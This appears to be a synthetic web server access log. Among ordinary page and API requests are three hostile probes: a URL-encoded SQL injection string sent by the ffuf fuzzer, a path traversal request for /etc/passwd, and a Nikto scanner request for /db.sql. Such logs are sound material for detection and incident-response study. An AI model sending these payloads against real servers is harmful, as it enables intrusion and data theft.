192.168.1.12 - - [21/May/2026:19:54:11 +0000] "GET /index.html HTTP/1.1" 200 5514 "https://www.google.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
192.168.1.13 - - [21/May/2026:09:13:21 +0000] "GET /products/43 HTTP/1.1" 200 3797 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
45.155.205.33 - - [21/May/2026:12:39:48 +0000] "GET /api/v1/user?id=1%27%2bOR%2b%271%27%3d%271 HTTP/1.1" 404 576 "-" "ffuf/2.1.0"
192.168.1.13 - - [21/May/2026:17:10:42 +0000] "GET /about HTTP/1.1" 200 1955 "https://yandex.ru/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
203.0.113.10 - - [21/May/2026:09:46:23 +0000] "GET /checkout HTTP/1.1" 200 773 "https://yandex.ru/" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
192.168.1.13 - - [21/May/2026:17:08:41 +0000] "GET /search?q=phone HTTP/1.1" 200 6028 "https://mail.example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
10.0.0.24 - - [21/May/2026:13:00:58 +0000] "GET /checkout HTTP/1.1" 200 6561 "https://yandex.ru/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
10.0.0.24 - - [21/May/2026:15:30:25 +0000] "GET /api/v1/user/profile HTTP/1.1" 404 867 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
172.16.0.45 - - [21/May/2026:12:39:28 +0000] "GET /index.php?page=..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1" 403 741 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
91.240.118.172 - - [21/May/2026:12:39:42 +0000] "POST /db.sql HTTP/1.1" 200 7924 "-" "Nikto/2.5.0"
203.0.113.12 - - [21/May/2026:14:24:55 +0000] "GET /api/v1/products?page=1 HTTP/1.1" 200 6990 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
10.0.0.23 - - [21/May/2026:12:00:33 +0000] "GET /api/v1/products?page=2 HTTP/1.1" 200 4772 "https://mail.example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
